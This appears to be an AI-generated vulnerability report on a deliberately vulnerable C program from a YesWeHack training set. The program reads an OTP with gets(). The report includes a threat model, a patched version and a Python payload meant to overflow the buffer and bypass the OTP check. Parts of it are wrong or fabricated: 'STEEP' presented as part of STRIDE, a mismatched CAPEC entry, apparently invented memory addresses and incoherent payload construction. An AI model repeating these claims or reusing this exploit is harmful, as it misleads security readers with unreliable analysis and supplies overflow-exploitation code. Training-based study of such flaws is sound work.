Title: Buffer Overflow Vulnerability
Description: The code is a C program that takes user input for a One-Time Password (OTP) and compares it to a pre-defined OTP. The OTP is obtained from the GetOTP() function. The program allows the user to enter the OTP three times before terminating.
Issue: The program uses the gets() function to read user input into the tryOTP buffer, which can lead to a buffer overflow vulnerability. The buffer is only allocated 4 bytes, but gets() does not check the size of the input, which can lead to overwriting adjacent memory.
Threat Model: The vulnerability can be exploited using the Spoofing, Tampering, and Elevation of Privilege (STEEP) methods of the STRIDE methodology.
Proof of Concept: To test the vulnerability, an attacker can input more than 4 characters as the OTP. This will cause the buffer to overflow and potentially overwrite adjacent memory. A proof of concept script is provided below:


#!/bin/bash
echo -n "Enter OTP (Five digits): "
python -c 'print "A"*5' | ./23-bof


Taint Analysis: The input from gets() is directly stored in the tryOTP buffer, which is then used in the strcmp() function. This means that any input that overflows the buffer can potentially overwrite adjacent memory and modify the behavior of the program.

Recommendation: To remediate the vulnerability, the gets() function should be replaced with a safer alternative such as fgets(). Additionally, the tryOTP buffer should be allocated with a size that can accommodate the maximum input length. The modified code is shown below:


#include <stdio.h>
#include <string.h>

char* GetOTP(){
    //Code...
    //Example OPT code return:
    return "1337";
}

/**
 * YesWeHack - Vulnerable Code Snippet
*/

// Run: gcc 23-bufferOverflow.c -fno-stack-protector -o 23-bof
// Then run the program: ./23-bof

// If that do not work, run: `chmod +x 23-bufferOverflow.c`. Then run it again

int LoadDashboard(){}

int main(void)
{
    char *OTP = GetOTP();
    char tryOTP[6];
    int root = 0;

    for ( int tries = 0; tries < 3; tries++ ) {
        printf("Enter OTP (Five digits): ");
        fgets(tryOTP, 6, stdin);
        tryOTP[strcspn(tryOTP, "\n")] = 0; // remove trailing newline

        //Check if the user has root privileges or OPT:
        if ( root || strcmp(tryOTP, OTP) == 0 ) {
            printf("> Success, loading dashboard\n");
            LoadDashboard();
            return 1;
        } else {
            printf ("> Incorrect OTP\n");
        }

        if ( tries >= 3 ) {
            return 0;
        }
    }
}


Taxonomy: The vulnerability is a CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer and a CAPEC-242: Buffer Overflow via Environment Variables.

CVSS Score: The CVSS3.1 score for this vulnerability is 7.8 (High).

Testing: .\train\23-bufferOverflow.c
Sure, here's a proof of concept in Python to exploit the buffer overflow vulnerability in the provided code:


import struct

# Address of the LoadDashboard function
LOAD_DASHBOARD_ADDR = 0x080491b2

# Address of the root variable
ROOT_ADDR = 0x0804a048

# Address of the OTP variable
OTP_ADDR = 0x0804a040

# Address of the tryOTP variable
TRY_OTP_ADDR = 0x0804a04c

# Offset to overwrite the return address
RET_OFFSET = 0x5c

# Payload to overwrite the root variable and return to the LoadDashboard function
payload = b'A' * RET_OFFSET
payload += struct.pack('<I', ROOT_ADDR)
payload += b'A' * 4
payload += struct.pack('<I', LOAD_DASHBOARD_ADDR)

# Send the payload to the vulnerable program
print(payload)

You can run this code by saving it to a file (e.g. `exploit.py`) and running it with Python: `python exploit.py | ./23-bof`. This will send the payload to the vulnerable program and overwrite the `root` variable with a non-zero value, allowing the user to bypass the OTP check and load the dashboard.
